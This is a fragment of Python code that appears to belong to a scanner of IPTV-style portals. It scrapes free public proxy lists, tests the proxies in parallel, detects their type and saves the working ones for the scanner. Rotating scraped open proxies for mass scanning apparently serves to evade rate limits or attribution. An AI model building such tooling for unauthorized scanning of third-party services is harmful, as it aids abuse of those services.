    from urllib.parse import urlparse
    
    portal_url = hit_data.get("portal", "")
    channels = hit_data.get("channels", 0)
    has_de = hit_data.get("has_de", False)
    
    # Extract domain from URL
    domain = urlparse(portal_url).hostname or "Unknown"
    
    # Build name
    name = f"{domain}"
    if has_de:
        name += " 🇩🇪"
    name += f" ({channels}ch)"
    
    return name



# ============== PROXY MANAGEMENT ==============

def add_proxy_log(message, level="info"):
    """Add log entry to proxy state"""
    ts = datetime.now().strftime("%H:%M:%S")
    proxy_state["logs"].append({"time": ts, "level": level, "message": message})
    if len(proxy_state["logs"]) > 500:
        proxy_state["logs"] = proxy_state["logs"][-500:]


def fetch_proxies_worker():
    """Fetch proxies from configured sources"""
    import re
    import requests
    
    sources = scanner_data.get("proxy_sources", [])
    all_proxies = []
    
    add_proxy_log(f"Fetching from {len(sources)} sources...", "info")
    
    for source in sources:
        try:
            add_proxy_log(f"Fetching {source}", "info")
            resp = http_session.get(source, timeout=15)
            
            if "spys.me" in source:
                all_proxies.extend(re.findall(r"\d+\.\d+\.\d+\.\d+:\d+", resp.text))
            else:
                # Try HTML table
                matches = re.findall(r"<td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>", resp.text)
                if matches:
                    all_proxies.extend([f"{ip}:{port}" for ip, port in matches])
                else:
                    # Try prefixed
                    all_proxies.extend(re.findall(r"(?:socks[45]|http)://[^\s<>\"']+", resp.text, re.I))
                    # Try plain
                    all_proxies.extend(re.findall(r"\d+\.\d+\.\d+\.\d+:\d+", resp.text))
        except Exception as e:
            add_proxy_log(f"Error: {source} - {e}", "error")
    
    all_proxies = list(set(all_proxies))
    proxy_state["proxies"] = all_proxies
    add_proxy_log(f"Found {len(all_proxies)} unique proxies", "success")
    proxy_state["fetching"] = False


def test_proxies_worker(proxies_to_test):
    """Test proxies for connectivity"""
    import requests
    
    if not proxies_to_test:
        add_proxy_log("No proxies to test", "warning")
        proxy_state["testing"] = False
        return
    
    working, failed = [], []
    threads = get_scanner_settings().get("proxy_test_threads", 50)
    add_proxy_log(f"Testing {len(proxies_to_test)} proxies ({threads} threads)...", "info")
    
    def test(p):
        try:
            proxy_dict = {"http": f"http://{p}", "https": f"http://{p}"}
            if p.startswith("socks"):
                proxy_dict = {"http": p, "https": p}
            elif p.startswith("http"):
                proxy_dict = {"http": p, "https": p}
            
            resp = http_session.get("http://httpbin.org/ip", proxies=proxy_dict, timeout=10)
            return p, resp.status_code == 200
        except:
            return p, False
    
    with ThreadPoolExecutor(max_workers=threads) as ex:
        for proxy, ok in ex.map(lambda p: test(p), proxies_to_test):
            if ok:
                working.append(proxy)
                add_proxy_log(f"✓ {proxy}", "success")
            else:
                failed.append(proxy)
                add_proxy_log(f"✗ {proxy}", "error")
    
    proxy_state["working_proxies"] = working
    proxy_state["failed_proxies"] = failed
    add_proxy_log(f"Done: {len(working)}/{len(proxies_to_test)} working", "success")
    proxy_state["testing"] = False


def test_proxies_autodetect_worker(proxies_to_test):
    """Test proxies with auto-detection of proxy type"""
    import requests
    
    if not proxies_to_test:
        add_proxy_log("No proxies to test", "warning")
        proxy_state["testing"] = False
        return
    
    result_proxies, failed = [], []
    threads = get_scanner_settings().get("proxy_test_threads", 50)
    add_proxy_log(f"Testing {len(proxies_to_test)} proxies (auto-detect type)...", "info")
    
    def test_autodetect(proxy):
        base = proxy
        for prefix in ["socks5://", "socks4://", "http://"]:
            if proxy.startswith(prefix):
                base = proxy[len(prefix):]
                break
        
        auth = ""
        if "@" in base:
            auth, base = base.rsplit("@", 1)
            auth += "@"
        
        for test_proxy, ptype in [(base, "HTTP"), (f"socks5://{auth}{base}", "SOCKS5"), (f"socks4://{base}", "SOCKS4")]:
            try:
                proxy_dict = {"http": f"http://{test_proxy}", "https": f"http://{test_proxy}"}
                if test_proxy.startswith("socks"):
                    proxy_dict = {"http": test_proxy, "https": test_proxy}
                
                resp = http_session.get("http://httpbin.org/ip", proxies=proxy_dict, timeout=10)
                if resp.status_code == 200:
                    return proxy, test_proxy, ptype, True
            except:
                pass
        return proxy, proxy, "NONE", False
    
    with ThreadPoolExecutor(max_workers=threads) as ex:
        for orig, detected, ptype, ok in ex.map(test_autodetect, proxies_to_test):
            if ok:
                result_proxies.append(detected)
                add_proxy_log(f"✓ {detected} ({ptype})", "success")
            else:
                failed.append(orig)
                add_proxy_log(f"✗ {orig}", "error")
    
    proxy_state["working_proxies"] = result_proxies
    proxy_state["failed_proxies"] = failed
    
    # Update scanner data with working proxies
    scanner_data["proxies"] = result_proxies + failed
    save_scanner_config()
    
    add_proxy_log(f"Done: {len(result_proxies)}/{len(proxies_to_test)} working", "success")
    proxy_state["testing"] = False
